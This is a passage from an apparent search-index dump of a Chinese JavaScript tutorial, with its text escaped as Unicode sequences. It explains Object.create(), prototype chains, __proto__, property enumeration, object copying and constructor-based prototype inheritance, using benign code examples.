\u4e0b\u9762\u4e09\u79cd\u65b9\u5f0f\u751f\u6210\u7684\u65b0\u5bf9\u8c61\u662f\u7b49\u4ef7\u7684\u3002 1 2 3 var obj1 = Object . create ({}); var obj2 = Object . create ( Object . prototype ); var obj3 = new Object (); \u5982\u679c\u60f3\u8981\u751f\u6210\u4e00\u4e2a\u4e0d\u7ee7\u627f\u4efb\u4f55\u5c5e\u6027\uff08\u6bd4\u5982\u6ca1\u6709 toString() \u548c valueOf() \u65b9\u6cd5\uff09\u7684\u5bf9\u8c61\uff0c\u53ef\u4ee5\u5c06 Object.create() \u7684\u53c2\u6570\u8bbe\u4e3a null \u3002 1 2 3 4 var obj = Object . create ( null ); obj . valueOf () // TypeError: Object [object Object] has no method 'valueOf' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u7684\u539f\u578b\u662f null \uff0c\u5b83\u5c31\u4e0d\u5177\u5907\u4e00\u4e9b\u5b9a\u4e49\u5728 Object.prototype \u5bf9\u8c61\u4e0a\u9762\u7684\u5c5e\u6027\uff0c\u6bd4\u5982 valueOf() \u65b9\u6cd5\u3002 \u4f7f\u7528 Object.create() \u65b9\u6cd5\u7684\u65f6\u5019\uff0c\u5fc5\u987b\u63d0\u4f9b\u5bf9\u8c61\u539f\u578b\uff0c\u5373\u53c2\u6570\u4e0d\u80fd\u4e3a\u7a7a\uff0c\u6216\u8005\u4e0d\u662f\u5bf9\u8c61\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002 1 2 3 4 Object . create () // TypeError: Object prototype may only be an Object or null Object . create ( 123 ) // TypeError: Object prototype may only be an Object or null Object.create() \u65b9\u6cd5\u751f\u6210\u7684\u65b0\u5bf9\u8c61\uff0c\u52a8\u6001\u7ee7\u627f\u4e86\u539f\u578b\u3002\u5728\u539f\u578b\u4e0a\u6dfb\u52a0\u6216\u4fee\u6539\u4efb\u4f55\u65b9\u6cd5\uff0c\u4f1a\u7acb\u523b\u53cd\u6620\u5728\u65b0\u5bf9\u8c61\u4e4b\u4e0a\u3002 1 2 3 4 5 var obj1 = { p : 1 }; var obj2 = Object . create ( obj1 ); obj1 . p = 2 ; obj2 . p // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4fee\u6539\u5bf9\u8c61\u539f\u578b obj1 \u4f1a\u5f71\u54cd\u5230\u5b9e\u4f8b\u5bf9\u8c61 obj2 \u3002 \u9664\u4e86\u5bf9\u8c61\u7684\u539f\u578b\uff0c Object.create() \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\u3002\u8be5\u53c2\u6570\u662f\u4e00\u4e2a\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\uff0c\u5b83\u6240\u63cf\u8ff0\u7684\u5bf9\u8c61\u5c5e\u6027\uff0c\u4f1a\u6dfb\u52a0\u5230\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u4f5c\u4e3a\u8be5\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 var obj = Object . create ({}, { p1 : { value : 123 , enumerable : true , configurable : true , writable : true , }, p2 : { value : 'abc' , enumerable : true , configurable : true , writable : true , } }); // \u7b49\u540c\u4e8e var obj = Object . create ({}); obj . p1 = 123 ; obj . p2 = 'abc' ; Object.create() \u65b9\u6cd5\u751f\u6210\u7684\u5bf9\u8c61\uff0c\u7ee7\u627f\u4e86\u5b83\u7684\u539f\u578b\u5bf9\u8c61\u7684\u6784\u9020\u51fd\u6570\u3002 1 2 3 4 5 6 function A () {} var a = new A (); var b = Object . create ( a ); b . constructor === A // true b instanceof A // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c b \u5bf9\u8c61\u7684\u539f\u578b\u662f a \u5bf9\u8c61\uff0c\u56e0\u6b64\u7ee7\u627f\u4e86 a \u5bf9\u8c61\u7684\u6784\u9020\u51fd\u6570 A \u3002","title":"Object.create()"},{"location":"oop/object/#objectprototypeisprototypeof","text":"\u5b9e\u4f8b\u5bf9\u8c61\u7684 isPrototypeOf \u65b9\u6cd5\uff0c\u7528\u6765\u5224\u65ad\u8be5\u5bf9\u8c61\u662f\u5426\u4e3a\u53c2\u6570\u5bf9\u8c61\u7684\u539f\u578b\u3002 1 2 3 4 5 6 var o1 = {}; var o2 = Object . create ( o1 ); var o3 = Object . create ( o2 ); o2 . isPrototypeOf ( o3 ) // true o1 . isPrototypeOf ( o3 ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c o1 \u548c o2 \u90fd\u662f o3 \u7684\u539f\u578b\u3002\u8fd9\u8868\u660e\u53ea\u8981\u5b9e\u4f8b\u5bf9\u8c61\u5904\u5728\u53c2\u6570\u5bf9\u8c61\u7684\u539f\u578b\u94fe\u4e0a\uff0c isPrototypeOf \u65b9\u6cd5\u90fd\u8fd4\u56de true \u3002 1 2 3 4 Object . prototype . isPrototypeOf ({}) // true Object . prototype . isPrototypeOf ([]) // true Object . prototype . isPrototypeOf ( /xyz/ ) // true Object . prototype . isPrototypeOf ( Object . create ( null )) // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e Object.prototype \u5904\u4e8e\u539f\u578b\u94fe\u7684\u6700\u9876\u7aef\uff0c\u6240\u4ee5\u5bf9\u5404\u79cd\u5b9e\u4f8b\u90fd\u8fd4\u56de true \uff0c\u53ea\u6709\u76f4\u63a5\u7ee7\u627f\u81ea null \u7684\u5bf9\u8c61\u9664\u5916\u3002","title":"Object.prototype.isPrototypeOf()"},{"location":"oop/object/#objectprototype__proto__","text":"\u5b9e\u4f8b\u5bf9\u8c61\u7684 __proto__ \u5c5e\u6027\uff08\u524d\u540e\u5404\u4e24\u4e2a\u4e0b\u5212\u7ebf\uff09\uff0c\u8fd4\u56de\u8be5\u5bf9\u8c61\u7684\u539f\u578b\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 1 2 3 4 5 var obj = {}; var p = {}; obj . __proto__ = p ; Object . getPrototypeOf ( obj ) === p // true \u4e0a\u9762\u4ee3\u7801\u901a\u8fc7 __proto__ \u5c5e\u6027\uff0c\u5c06 p \u5bf9\u8c61\u8bbe\u4e3a obj \u5bf9\u8c61\u7684\u539f\u578b\u3002 \u6839\u636e\u8bed\u8a00\u6807\u51c6\uff0c __proto__ \u5c5e\u6027\u53ea\u6709\u6d4f\u89c8\u5668\u624d\u9700\u8981\u90e8\u7f72\uff0c\u5176\u4ed6\u73af\u5883\u53ef\u4ee5\u6ca1\u6709\u8fd9\u4e2a\u5c5e\u6027\u3002\u5b83\u524d\u540e\u7684\u4e24\u6839\u4e0b\u5212\u7ebf\uff0c\u8868\u660e\u5b83\u672c\u8d28\u662f\u4e00\u4e2a\u5185\u90e8\u5c5e\u6027\uff0c\u4e0d\u5e94\u8be5\u5bf9\u4f7f\u7528\u8005\u66b4\u9732\u3002\u56e0\u6b64\uff0c\u5e94\u8be5\u5c3d\u91cf\u5c11\u7528\u8fd9\u4e2a\u5c5e\u6027\uff0c\u800c\u662f\u7528 Object.getPrototypeOf() \u548c Object.setPrototypeOf() \uff0c\u8fdb\u884c\u539f\u578b\u5bf9\u8c61\u7684\u8bfb\u5199\u64cd\u4f5c\u3002 \u539f\u578b\u94fe\u53ef\u4ee5\u7528 __proto__ \u5f88\u76f4\u89c2\u5730\u8868\u793a\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 var A = { name : '\u5f20\u4e09' }; var B = { name : '\u674e\u56db' }; var proto = { print : function () { console . log ( this . name ); } }; A . __proto__ = proto ; B . __proto__ = proto ; A . print () // \u5f20\u4e09 B . print () // \u674e\u56db A . print === B . print // true A . print === proto . print // true B . print === proto . print // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c A \u5bf9\u8c61\u548c B \u5bf9\u8c61\u7684\u539f\u578b\u90fd\u662f proto \u5bf9\u8c61\uff0c\u5b83\u4eec\u90fd\u5171\u4eab proto \u5bf9\u8c61\u7684 print \u65b9\u6cd5\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c A \u548c B \u7684 print \u65b9\u6cd5\uff0c\u90fd\u662f\u5728\u8c03\u7528 proto \u5bf9\u8c61\u7684 print \u65b9\u6cd5\u3002","title":"Object.prototype.__proto__"},{"location":"oop/object/#_1","text":"\u5982\u524d\u6240\u8ff0\uff0c __proto__ \u5c5e\u6027\u6307\u5411\u5f53\u524d\u5bf9\u8c61\u7684\u539f\u578b\u5bf9\u8c61\uff0c\u5373\u6784\u9020\u51fd\u6570\u7684 prototype \u5c5e\u6027\u3002 1 2 3 4 5 6 var obj = new Object (); obj . __proto__ === Object . prototype // true obj . __proto__ === obj . constructor . prototype // true \u4e0a\u9762\u4ee3\u7801\u9996\u5148\u65b0\u5efa\u4e86\u4e00\u4e2a\u5bf9\u8c61 obj \uff0c\u5b83\u7684 __proto__ \u5c5e\u6027\uff0c\u6307\u5411\u6784\u9020\u51fd\u6570\uff08 Object \u6216 obj.constructor \uff09\u7684 prototype \u5c5e\u6027\u3002 \u56e0\u6b64\uff0c\u83b7\u53d6\u5b9e\u4f8b\u5bf9\u8c61 obj \u7684\u539f\u578b\u5bf9\u8c61\uff0c\u6709\u4e09\u79cd\u65b9\u6cd5\u3002 obj.__proto__ obj.constructor.prototype Object.getPrototypeOf(obj) \u4e0a\u9762\u4e09\u79cd\u65b9\u6cd5\u4e4b\u4e2d\uff0c\u524d\u4e24\u79cd\u90fd\u4e0d\u662f\u5f88\u53ef\u9760\u3002 __proto__ \u5c5e\u6027\u53ea\u6709\u6d4f\u89c8\u5668\u624d\u9700\u8981\u90e8\u7f72\uff0c\u5176\u4ed6\u73af\u5883\u53ef\u4ee5\u4e0d\u90e8\u7f72\u3002\u800c obj.constructor.prototype \u5728\u624b\u52a8\u6539\u53d8\u539f\u578b\u5bf9\u8c61\u65f6\uff0c\u53ef\u80fd\u4f1a\u5931\u6548\u3002 1 2 3 4 5 6 7 8 var P = function () {}; var p = new P (); var C = function () {}; C . prototype = p ; var c = new C (); c . constructor . prototype === p // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6784\u9020\u51fd\u6570 C \u7684\u539f\u578b\u5bf9\u8c61\u88ab\u6539\u6210\u4e86 p \uff0c\u4f46\u662f\u5b9e\u4f8b\u5bf9\u8c61\u7684 c.constructor.prototype \u5374\u6ca1\u6709\u6307\u5411 p \u3002\u6240\u4ee5\uff0c\u5728\u6539\u53d8\u539f\u578b\u5bf9\u8c61\u65f6\uff0c\u4e00\u822c\u8981\u540c\u65f6\u8bbe\u7f6e constructor \u5c5e\u6027\u3002 1 2 3 4 5 C . prototype = p ; C . prototype . constructor = C ; var c = new C (); c . constructor . prototype === p // true \u56e0\u6b64\uff0c\u63a8\u8350\u4f7f\u7528\u7b2c\u4e09\u79cd Object.getPrototypeOf \u65b9\u6cd5\uff0c\u83b7\u53d6\u539f\u578b\u5bf9\u8c61\u3002","title":"\u83b7\u53d6\u539f\u578b\u5bf9\u8c61\u65b9\u6cd5\u7684\u6bd4\u8f83"},{"location":"oop/object/#objectgetownpropertynames","text":"Object.getOwnPropertyNames \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u53c2\u6570\u5bf9\u8c61\u672c\u8eab\u7684\u6240\u6709\u5c5e\u6027\u7684\u952e\u540d\uff0c\u4e0d\u5305\u542b\u7ee7\u627f\u7684\u5c5e\u6027\u952e\u540d\u3002 1 2 Object . getOwnPropertyNames ( Date ) // [\"parse\", \"arguments\", \"UTC\", \"caller\", \"name\", \"prototype\", \"now\", \"length\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object.getOwnPropertyNames \u65b9\u6cd5\u8fd4\u56de Date \u6240\u6709\u81ea\u8eab\u7684\u5c5e\u6027\u540d\u3002 \u5bf9\u8c61\u672c\u8eab\u7684\u5c5e\u6027\u4e4b\u4e2d\uff0c\u6709\u7684\u662f\u53ef\u4ee5\u904d\u5386\u7684\uff08enumerable\uff09\uff0c\u6709\u7684\u662f\u4e0d\u53ef\u4ee5\u904d\u5386\u7684\u3002 Object.getOwnPropertyNames \u65b9\u6cd5\u8fd4\u56de\u6240\u6709\u952e\u540d\uff0c\u4e0d\u7ba1\u662f\u5426\u53ef\u4ee5\u904d\u5386\u3002\u53ea\u83b7\u53d6\u90a3\u4e9b\u53ef\u4ee5\u904d\u5386\u7684\u5c5e\u6027\uff0c\u4f7f\u7528 Object.keys \u65b9\u6cd5\u3002 1 Object . keys ( Date ) // [] \u4e0a\u9762\u4ee3\u7801\u8868\u660e\uff0c Date \u5bf9\u8c61\u6240\u6709\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u90fd\u662f\u4e0d\u53ef\u4ee5\u904d\u5386\u7684\u3002","title":"Object.getOwnPropertyNames()"},{"location":"oop/object/#objectprototypehasownproperty","text":"\u5bf9\u8c61\u5b9e\u4f8b\u7684 hasOwnProperty \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u7528\u4e8e\u5224\u65ad\u67d0\u4e2a\u5c5e\u6027\u5b9a\u4e49\u5728\u5bf9\u8c61\u81ea\u8eab\uff0c\u8fd8\u662f\u5b9a\u4e49\u5728\u539f\u578b\u94fe\u4e0a\u3002 1 2 Date . hasOwnProperty ( 'length' ) // true Date . hasOwnProperty ( 'toString' ) // false \u4e0a\u9762\u4ee3\u7801\u8868\u660e\uff0c Date.length \uff08\u6784\u9020\u51fd\u6570 Date \u53ef\u4ee5\u63a5\u53d7\u591a\u5c11\u4e2a\u53c2\u6570\uff09\u662f Date \u81ea\u8eab\u7684\u5c5e\u6027\uff0c Date.toString \u662f\u7ee7\u627f\u7684\u5c5e\u6027\u3002 \u53e6\u5916\uff0c hasOwnProperty \u65b9\u6cd5\u662f JavaScript \u4e4b\u4e2d\u552f\u4e00\u4e00\u4e2a\u5904\u7406\u5bf9\u8c61\u5c5e\u6027\u65f6\uff0c\u4e0d\u4f1a\u904d\u5386\u539f\u578b\u94fe\u7684\u65b9\u6cd5\u3002","title":"Object.prototype.hasOwnProperty()"},{"location":"oop/object/#in-forin","text":"in \u8fd0\u7b97\u7b26\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u5177\u6709\u67d0\u4e2a\u5c5e\u6027\u3002\u5b83\u4e0d\u533a\u5206\u8be5\u5c5e\u6027\u662f\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u8fd8\u662f\u7ee7\u627f\u7684\u5c5e\u6027\u3002 1 2 'length' in Date // true 'toString' in Date // true in \u8fd0\u7b97\u7b26\u5e38\u7528\u4e8e\u68c0\u67e5\u4e00\u4e2a\u5c5e\u6027\u662f\u5426\u5b58\u5728\u3002 \u83b7\u5f97\u5bf9\u8c61\u7684\u6240\u6709\u53ef\u904d\u5386\u5c5e\u6027\uff08\u4e0d\u7ba1\u662f\u81ea\u8eab\u7684\u8fd8\u662f\u7ee7\u627f\u7684\uff09\uff0c\u53ef\u4ee5\u4f7f\u7528 for...in \u5faa\u73af\u3002 1 2 3 4 5 6 7 8 9 10 11 var o1 = { p1 : 123 }; var o2 = Object . create ( o1 , { p2 : { value : \"abc\" , enumerable : true } }); for ( p in o2 ) { console . info ( p ); } // p2 // p1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 o2 \u7684 p2 \u5c5e\u6027\u662f\u81ea\u8eab\u7684\uff0c p1 \u5c5e\u6027\u662f\u7ee7\u627f\u7684\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u4f1a\u88ab for...in \u5faa\u73af\u904d\u5386\u3002 \u4e3a\u4e86\u5728 for...in \u5faa\u73af\u4e2d\u83b7\u5f97\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u53ef\u4ee5\u91c7\u7528 hasOwnProperty \u65b9\u6cd5\u5224\u65ad\u4e00\u4e0b\u3002 1 2 3 4 5 for ( var name in object ) { if ( object . hasOwnProperty ( name ) ) { /* loop code */ } } \u83b7\u5f97\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\uff08\u4e0d\u7ba1\u662f\u81ea\u8eab\u7684\u8fd8\u662f\u7ee7\u627f\u7684\uff0c\u4e5f\u4e0d\u7ba1\u662f\u5426\u53ef\u679a\u4e3e\uff09\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 function inheritedPropertyNames ( obj ) { var props = {}; while ( obj ) { Object . getOwnPropertyNames ( obj ). forEach ( function ( p ) { props [ p ] = true ; }); obj = Object . getPrototypeOf ( obj ); } return Object . getOwnPropertyNames ( props ); } \u4e0a\u9762\u4ee3\u7801\u4f9d\u6b21\u83b7\u53d6 obj \u5bf9\u8c61\u7684\u6bcf\u4e00\u7ea7\u539f\u578b\u5bf9\u8c61\u201c\u81ea\u8eab\u201d\u7684\u5c5e\u6027\uff0c\u4ece\u800c\u83b7\u53d6 obj \u5bf9\u8c61\u7684\u201c\u6240\u6709\u201d\u5c5e\u6027\uff0c\u4e0d\u7ba1\u662f\u5426\u53ef\u904d\u5386\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5217\u51fa Date \u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 inheritedPropertyNames ( Date ) // [ // \"caller\", // \"constructor\", // \"toString\", // \"UTC\", // ... // ]","title":"in \u8fd0\u7b97\u7b26\u548c for...in \u5faa\u73af"},{"location":"oop/object/#_2","text":"\u5982\u679c\u8981\u62f7\u8d1d\u4e00\u4e2a\u5bf9\u8c61\uff0c\u9700\u8981\u505a\u5230\u4e0b\u9762\u4e24\u4ef6\u4e8b\u60c5\u3002 \u786e\u4fdd\u62f7\u8d1d\u540e\u7684\u5bf9\u8c61\uff0c\u4e0e\u539f\u5bf9\u8c61\u5177\u6709\u540c\u6837\u7684\u539f\u578b\u3002 \u786e\u4fdd\u62f7\u8d1d\u540e\u7684\u5bf9\u8c61\uff0c\u4e0e\u539f\u5bf9\u8c61\u5177\u6709\u540c\u6837\u7684\u5b9e\u4f8b\u5c5e\u6027\u3002 \u4e0b\u9762\u5c31\u662f\u6839\u636e\u4e0a\u9762\u4e24\u70b9\uff0c\u5b9e\u73b0\u7684\u5bf9\u8c61\u62f7\u8d1d\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function copyObject ( orig ) { var copy = Object . create ( Object . getPrototypeOf ( orig )); copyOwnPropertiesFrom ( copy , orig ); return copy ; } function copyOwnPropertiesFrom ( target , source ) { Object . getOwnPropertyNames ( source ) . forEach ( function ( propKey ) { var desc = Object . getOwnPropertyDescriptor ( source , propKey ); Object . defineProperty ( target , propKey , desc ); }); return target ; } \u53e6\u4e00\u79cd\u66f4\u7b80\u5355\u7684\u5199\u6cd5\uff0c\u662f\u5229\u7528 ES2017 \u624d\u5f15\u5165\u6807\u51c6\u7684 Object.getOwnPropertyDescriptors \u65b9\u6cd5\u3002 1 2 3 4 5 6 function copyObject ( orig ) { return Object . create ( Object . getPrototypeOf ( orig ), Object . getOwnPropertyDescriptors ( orig ) ); }","title":"\u5bf9\u8c61\u7684\u62f7\u8d1d"},{"location":"oop/object/#_3","text":"Dr. Axel Rauschmayer, JavaScript properties: inheritance and enumerability","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"oop/prototype/","text":"\u5bf9\u8c61\u7684\u7ee7\u627f \u00b6 \u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u5f88\u91cd\u8981\u7684\u4e00\u4e2a\u65b9\u9762\uff0c\u5c31\u662f\u5bf9\u8c61\u7684\u7ee7\u627f\u3002A \u5bf9\u8c61\u901a\u8fc7\u7ee7\u627f B \u5bf9\u8c61\uff0c\u5c31\u80fd\u76f4\u63a5\u62e5\u6709 B \u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\u548c\u65b9\u6cd5\u3002\u8fd9\u5bf9\u4e8e\u4ee3\u7801\u7684\u590d\u7528\u662f\u975e\u5e38\u6709\u7528\u7684\u3002 \u5927\u90e8\u5206\u9762\u5411\u5bf9\u8c61\u7684\u7f16\u7a0b\u8bed\u8a00\uff0c\u90fd\u662f\u901a\u8fc7\u201c\u7c7b\u201d\uff08class\uff09\u5b9e\u73b0\u5bf9\u8c61\u7684\u7ee7\u627f\u3002\u4f20\u7edf\u4e0a\uff0cJavaScript \u8bed\u8a00\u7684\u7ee7\u627f\u4e0d\u901a\u8fc7 class\uff0c\u800c\u662f\u901a\u8fc7\u201c\u539f\u578b\u5bf9\u8c61\u201d\uff08prototype\uff09\u5b9e\u73b0\uff0c\u672c\u7ae0\u4ecb\u7ecd JavaScript \u7684\u539f\u578b\u94fe\u7ee7\u627f\u3002 ES6 \u5f15\u5165\u4e86 class \u8bed\u6cd5\uff0c\u57fa\u4e8e class \u7684\u7ee7\u627f\u4e0d\u5728\u8fd9\u4e2a\u6559\u7a0b\u4ecb\u7ecd\uff0c\u8bf7\u53c2\u9605\u300aES6 \u6807\u51c6\u5165\u95e8\u300b\u4e00\u4e66\u7684\u76f8\u5173\u7ae0\u8282\u3002 \u539f\u578b\u5bf9\u8c61\u6982\u8ff0 \u00b6 \u6784\u9020\u51fd\u6570\u7684\u7f3a\u70b9 \u00b6 JavaScript \u901a\u8fc7\u6784\u9020\u51fd\u6570\u751f\u6210\u65b0\u5bf9\u8c61\uff0c\u56e0\u6b64\u6784\u9020\u51fd\u6570\u53ef\u4ee5\u89c6\u4e3a\u5bf9\u8c61\u7684\u6a21\u677f\u3002\u5b9e\u4f8b\u5bf9\u8c61\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5b9a\u4e49\u5728\u6784\u9020\u51fd\u6570\u5185\u90e8\u3002 1 2 3 4 5 6 7 8 9 function Cat ( name , color ) { this . name = name ; this . color = color ; } var cat1 = new Cat ( '\u5927\u6bdb' , '\u767d\u8272' ); cat1 . name // '\u5927\u6bdb' cat1 . color // '\u767d\u8272' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Cat \u51fd\u6570\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u51fd\u6570\u5185\u90e8\u5b9a\u4e49\u4e86 name \u5c5e\u6027\u548c color \u5c5e\u6027\uff0c\u6240\u6709\u5b9e\u4f8b\u5bf9\u8c61\uff08\u4e0a\u4f8b\u662f cat1 \uff09\u90fd\u4f1a\u751f\u6210\u8fd9\u4e24\u4e2a\u5c5e\u6027\uff0c\u5373\u8fd9\u4e24\u4e2a\u5c5e\u6027\u4f1a\u5b9a\u4e49\u5728\u5b9e\u4f8b\u5bf9\u8c61\u4e0a\u9762\u3002 \u901a\u8fc7\u6784\u9020\u51fd\u6570\u4e3a\u5b9e\u4f8b\u5bf9\u8c61\u5b9a\u4e49\u5c5e\u6027\uff0c\u867d\u7136\u5f88\u65b9\u4fbf\uff0c\u4f46\u662f\u6709\u4e00\u4e2a\u7f3a\u70b9\u3002\u540c\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u7684\u591a\u4e2a\u5b9e\u4f8b\u4e4b\u95f4\uff0c\u65e0\u6cd5\u5171\u4eab\u5c5e\u6027\uff0c\u4ece\u800c\u9020\u6210\u5bf9\u7cfb\u7edf\u8d44\u6e90\u7684\u6d6a\u8d39\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 function Cat ( name , color ) { this . name = name ; this . color = color ; this . meow = function () { console . log ( '\u55b5\u55b5' ); }; } var cat1 = new Cat ( '\u5927\u6bdb' , '\u767d\u8272' ); var cat2 = new Cat ( '\u4e8c\u6bdb' , '\u9ed1\u8272' ); cat1 . meow === cat2 . meow // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c cat1 \u548c cat2 \u662f\u540c\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u7684\u4e24\u4e2a\u5b9e\u4f8b\uff0c\u5b83\u4eec\u90fd\u5177\u6709 meow \u65b9\u6cd5\u3002\u7531\u4e8e meow \u65b9\u6cd5\u662f\u751f\u6210\u5728\u6bcf\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u4e0a\u9762\uff0c\u6240\u4ee5\u4e24\u4e2a\u5b9e\u4f8b\u5c31\u751f\u6210\u4e86\u4e24\u6b21\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6bcf\u65b0\u5efa\u4e00\u4e2a\u5b9e\u4f8b\uff0c\u5c31\u4f1a\u65b0\u5efa\u4e00\u4e2a meow \u65b9\u6cd5\u3002\u8fd9\u65e2\u6ca1\u6709\u5fc5\u8981\uff0c\u53c8\u6d6a\u8d39\u7cfb\u7edf\u8d44\u6e90\uff0c\u56e0\u4e3a\u6240\u6709 meow \u65b9\u6cd5\u90fd\u662f\u540c\u6837\u7684\u884c\u4e3a\uff0c\u5b8c\u5168\u5e94\u8be5\u5171\u4eab\u3002 \u8fd9\u4e2a\u95ee\u9898\u7684\u89e3\u51b3\u65b9\u6cd5\uff0c\u5c31\u662f JavaScript \u7684\u539f\u578b\u5bf9\u8c61\uff08prototype\uff09\u3002 prototype \u5c5e\u6027\u7684\u4f5c\u7528 \u00b6 JavaScript \u7ee7\u627f\u673a\u5236\u7684\u8bbe\u8ba1\u601d\u60f3\u5c31\u662f\uff0c\u539f\u578b\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u90fd\u80fd\u88ab\u5b9e\u4f8b\u5bf9\u8c61\u5171\u4eab\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u5c5e\u6027\u548c\u65b9\u6cd5\u5b9a\u4e49\u5728\u539f\u578b\u4e0a\uff0c\u90a3\u4e48\u6240\u6709\u5b9e\u4f8b\u5bf9\u8c61\u5c31\u80fd\u5171\u4eab\uff0c\u4e0d\u4ec5\u8282\u7701\u4e86\u5185\u5b58\uff0c\u8fd8\u4f53\u73b0\u4e86\u5b9e\u4f8b\u5bf9\u8c61\u4e4b\u95f4\u7684\u8054\u7cfb\u3002 \u4e0b\u9762\uff0c\u5148\u770b\u600e\u4e48\u4e3a\u5bf9\u8c61\u6307\u5b9a\u539f\u578b\u3002JavaScript \u89c4\u5b9a\uff0c\u6bcf\u4e2a\u51fd\u6570\u90fd\u6709\u4e00\u4e2a prototype \u5c5e\u6027\uff0c\u6307\u5411\u4e00\u4e2a\u5bf9\u8c61\u3002 1 2 function f () {} typeof f . prototype // \"object\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f \u9ed8\u8ba4\u5177\u6709 prototype \u5c5e\u6027\uff0c\u6307\u5411\u4e00\u4e2a\u5bf9\u8c61\u3002 \u5bf9\u4e8e\u666e\u901a\u51fd\u6570\u6765\u8bf4\uff0c\u8be5\u5c5e\u6027\u57fa\u672c\u65e0\u7528\u3002\u4f46\u662f\uff0c\u5bf9\u4e8e\u6784\u9020\u51fd\u6570\u6765\u8bf4\uff0c\u751f\u6210\u5b9e\u4f8b\u7684\u65f6\u5019\uff0c\u8be5\u5c5e\u6027\u4f1a\u81ea\u52a8\u6210\u4e3a\u5b9e\u4f8b\u5bf9\u8c61\u7684\u539f\u578b\u3002 1 2 3 4 5 6 7 8 9 10 function Animal ( name ) { this . name = name ; } Animal . prototype . color = 'white' ; var cat1 = new Animal ( '\u5927\u6bdb' ); var cat2 = new Animal ( '\u4e8c\u6bdb' ); cat1 . color // 'white' cat2 . color // 'white' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6784\u9020\u51fd\u6570 Animal \u7684 prototype \u5c5e\u6027\uff0c\u5c31\u662f\u5b9e\u4f8b\u5bf9\u8c61 cat1 \u548c cat2 \u7684\u539f\u578b\u5bf9\u8c61\u3002\u539f\u578b\u5bf9\u8c61\u4e0a\u6dfb\u52a0\u4e00\u4e2a color \u5c5e\u6027\uff0c\u7ed3\u679c\uff0c\u5b9e\u4f8b\u5bf9\u8c61\u90fd\u5171\u4eab\u4e86\u8be5\u5c5e\u6027\u3002 \u539f\u578b\u5bf9\u8c61\u7684\u5c5e\u6027\u4e0d\u662f\u5b9e\u4f8b\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\u3002\u53ea\u8981\u4fee\u6539\u539f\u578b\u5bf9\u8c61\uff0c\u53d8\u52a8\u5c31\u7acb\u523b\u4f1a\u4f53\u73b0\u5728**\u6240\u6709**\u5b9e\u4f8b\u5bf9\u8c61\u4e0a\u3002 1 2 3 4 Animal . prototype . color = 'yellow' ; cat1 . color // \"yellow\" cat2 . color // \"yellow\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u539f\u578b\u5bf9\u8c61\u7684 color \u5c5e\u6027\u7684\u503c\u53d8\u4e3a yellow \uff0c\u4e24\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u7684 color \u5c5e\u6027\u7acb\u523b\u8ddf\u7740\u53d8\u4e86\u3002\u8fd9\u662f\u56e0\u4e3a\u5b9e\u4f8b\u5bf9\u8c61\u5176\u5b9e\u6ca1\u6709 color \u5c5e\u6027\uff0c\u90fd\u662f\u8bfb\u53d6\u539f\u578b\u5bf9\u8c61\u7684 color 